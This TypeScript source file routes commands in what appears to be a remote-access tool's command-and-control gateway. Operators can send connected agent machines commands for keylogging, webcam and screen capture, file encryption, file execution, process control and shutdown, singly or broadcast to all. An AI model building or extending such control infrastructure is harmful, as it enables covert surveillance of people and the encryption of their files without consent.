import { WebSocket } from 'ws'
import { Message, createMessage } from '../types/Message'
import { CommandType } from '../types/Protocols'
import { AgentManager } from '../managers/AgentManager'
import { ClientManager } from '../managers/ClientManager'
import { ConnectionRegistry } from '../managers/ConnectionRegistry'
import { DatabaseManager } from '../managers/DatabaseManager'
import { ActivityLogger } from '../managers/ActivityLogger'
import { AuthHandler } from './AuthHandler'
import { TokenManager } from '../utils/TokenManager'
import { Logger } from '../utils/Logger'
import { Connection } from '../core/Connection'

export class RouteHandler {
    private authHandler: AuthHandler;
    private tokenManager: TokenManager;
    private activityLogger: ActivityLogger;

    private readonly HIGH_FREQUENCY_COMMANDS = [
        CommandType.FILE_CHUNK,
        CommandType.FILE_PROGRESS
    ];

    constructor (
        private agentManager: AgentManager,
        private clientManager: ClientManager,
        private connectionRegistry: ConnectionRegistry,
        private dbManager: DatabaseManager
    ) {
        this.authHandler = new AuthHandler(agentManager, clientManager, connectionRegistry, dbManager);
        this.tokenManager = new TokenManager();
        this.activityLogger = new ActivityLogger(dbManager);
    }

    public handle(ws: WebSocket, msg: Message) {
        if (msg.type == CommandType.AUTH) {
            this.authHandler.handle(ws, msg);
            return;
        }
        
        if (!ws.id) {
            if (msg.data?.token) {
                const payload = this.tokenManager.verifyToken(msg.data.token);
                if (payload) {
                    const conn = this.connectionRegistry.getConnection(payload.sessionId);
                    if (conn && conn.machineId === payload.machineId) {
                        ws.id = payload.sessionId;
                        ws.role = payload.role;
                    } else {
                        this.sendError(ws, "Token does not match active session. Please re-authenticate.");
                        return;
                    }
                } else {
                    this.sendError(ws, "Invalid or expired token. Please re-authenticate.");
                    return;
                }
            } else {
                this.sendError(ws, "Please login first");
                return;
            }
        }

        const conn = this.connectionRegistry.getConnection(ws.id!);
        if (!conn) {
            this.sendError(ws, "Connection not found. Please re-authenticate.");
            return;
        }

        if (conn.role === 'AGENT') {
            if (msg.to) {
                if (!msg.from) {
                    msg.from = conn.id;
                }
                this.forwardResponseFromAgent(ws, msg);
                return;
            }

            const broadcastTypes = [
                CommandType.SCREENSHOT, CommandType.CAM_SHOT, CommandType.CAM_RECORD, CommandType.SCR_RECORD, 
                CommandType.STREAM_DATA, CommandType.APP_LIST, CommandType.PROC_LIST,
                CommandType.FILE_LIST, CommandType.FILE_PROGRESS, CommandType.FILE_COMPLETE
            ];

            if (broadcastTypes.includes(msg.type as any)) {
                if (!msg.from) msg.from = conn.id;
                const clients = this.connectionRegistry.getConnectionsByRole('CLIENT');
                clients.forEach(client => {
                    if (client.isAlive) {
                        client.send({ ...msg, to: client.id });
                    }
                });
                return;
            }
        }

        if (conn.role === 'CLIENT') {

            const allowedForwardCommands = [
                CommandType.APP_LIST, CommandType.APP_START, CommandType.APP_KILL,
                CommandType.PROC_LIST, CommandType.PROC_START, CommandType.PROC_KILL,
                CommandType.CAM_RECORD, CommandType.CAM_SHOT, 
                CommandType.SCREENSHOT, CommandType.SCR_RECORD,
                CommandType.START_KEYLOG, CommandType.STOP_KEYLOG,
                CommandType.SHUTDOWN, CommandType.RESTART,
                CommandType.CONNECT_AGENT, CommandType.SYSTEM_INFO,
                CommandType.FILE_LIST, CommandType.FILE_UPLOAD, CommandType.FILE_DOWNLOAD, 
                CommandType.FILE_CHUNK, CommandType.FILE_ENCRYPT, CommandType.FILE_EXECUTE,
               ];

            if (msg.type === CommandType.GET_AGENTS) {
                const list = this.agentManager.getAgentListDetails();
                ws.send(JSON.stringify(createMessage(CommandType.GET_AGENTS, list)));
                this.activityLogger.logAgentListRequest(conn);
                Logger.info(`[Router] Sent agent list to ${conn.name} (${conn.id})`)
                return;
            }

            if (msg.type === CommandType.GET_ACTIVITY_HISTORY) {
                const query = msg.data || {};
                const activities = this.activityLogger.getActivityHistory({
                    clientId: query.clientId || conn.id,
                    action: query.action,
                    targetAgentId: query.targetAgentId,
                    startTime: query.startTime,
                    endTime: query.endTime,
                    limit: query.limit || 100,
                    offset: query.offset || 0
                });

                ws.send(JSON.stringify(createMessage(
                    CommandType.GET_ACTIVITY_HISTORY,
                    { activities, count: activities.length }
                )));
                this.activityLogger.logActivity(conn, 'get_activity_history', { success: true });
                return;
            }

            const fileCommands = [
                CommandType.FILE_LIST, CommandType.FILE_UPLOAD, 
                CommandType.FILE_DOWNLOAD, CommandType.FILE_CHUNK
            ];

            if (fileCommands.includes(msg.type as any)) {
                const targetId = msg.to || msg.data?.agentId;
                if (!targetId) {
                    this.sendError(ws, "Missing target agentId");
                    return;
                }

                const agent = this.connectionRegistry.getConnection(targetId);
                if (agent && agent.role === 'AGENT') {
                    msg.to = targetId;
                    msg.from = conn.id;
                    agent.send(msg);

                    if (msg.type !== CommandType.FILE_CHUNK) {
                        this.activityLogger.logActivity(conn, `file_cmd_${msg.type}`, { targetAgentId: targetId, success: true });
                    }
                } else {
                    this.sendError(ws, "Agent offline");
                }
                return;
            }

            if (msg.to === 'ALL') {
                this.broadcastToAgents(ws, msg);
                return;
            }

            if (msg.to && allowedForwardCommands.includes(msg.type as CommandType)) {
                this.forwardMessage(ws, msg);
                return;
            }

            if (msg.type === CommandType.ECHO) {
                ws.send(JSON.stringify(createMessage(
                    CommandType.ECHO,
                    "Gateway echo: " + msg.data
                )));
            }
        }
    }

    private forwardMessage(sender: WebSocket, msg: Message) {
        const targetId = msg.to!;
        const senderConn = this.connectionRegistry.getConnection(sender.id!);
        if (!senderConn) return;

        let targetAgent: Connection | null = this.connectionRegistry.getConnection(targetId);

        if (!targetAgent || targetAgent.role !== 'AGENT') {
            const client = this.clientManager.getClientSocket(targetId);
            targetAgent = client || null;
        }

        if (targetAgent && targetAgent.isAlive) {
            msg.from = sender.id;
            targetAgent.send(msg);
            
            if (!this.HIGH_FREQUENCY_COMMANDS.includes(msg.type as CommandType)) {
                const senderName = senderConn.name || sender.id;
                const targetName = targetAgent.name || targetId;

                this.activityLogger.logCommand(senderConn, msg, targetAgent, true);
                Logger.info(`[Router] Forwarded ${msg.type} from ${senderName} (${sender.id}) to ${targetName} (${targetId})`);
            }
        }
    }

    private forwardResponseFromAgent(agentWs: WebSocket, msg: Message) {
        const targetClientId = msg.to!;
        const agentConn = this.connectionRegistry.getConnection(agentWs.id!);
        if (!agentConn) return;

        const targetClient = this.connectionRegistry.getConnection(targetClientId);
        
        if (targetClient && targetClient.role === 'CLIENT' && targetClient.isAlive) {
            targetClient.send(msg);
            
            if (!this.HIGH_FREQUENCY_COMMANDS.includes(msg.type as CommandType)) {
                const agentName = agentConn.name || agentWs.id;
                const clientName = targetClient.name || targetClientId;
                Logger.info(`[Router] Forwarded response ${msg.type} from agent ${agentName} (${agentWs.id}) to client ${clientName} (${targetClientId})`);
                
                this.activityLogger.logActivity(agentConn, `response_${msg.type}`, {
                    targetAgentId: targetClientId,
                    success: true
                });
            }
        }
    }

    private broadcastToAgents(sender: WebSocket, msg: Message) {
        const senderConn = this.connectionRegistry.getConnection(sender.id!);
        if (!senderConn) return;

        const agents = this.connectionRegistry.getConnectionsByRole('AGENT');
        let count = 0;
        msg.from = sender.id;
        agents.forEach(agent =>{
            if (agent.isAlive) {
                agent.send(msg);
                count++
            }
        });

        this.activityLogger.logBroadcast(senderConn, msg, count);

        const senderName = senderConn.name || sender.id;
        Logger.info(`[Router] Broadcast ${msg.type} from ${senderName} (${sender.id}) to ${count} agents.`);
        sender.send(JSON.stringify(createMessage(
            CommandType.ECHO, 
            { msg: `Broadcasted to ${count} agents` }
        )));
    }

    private sendError(ws: WebSocket, msg: string) {
        ws.send(JSON.stringify(createMessage(CommandType.ERROR, { msg })));
    }
}
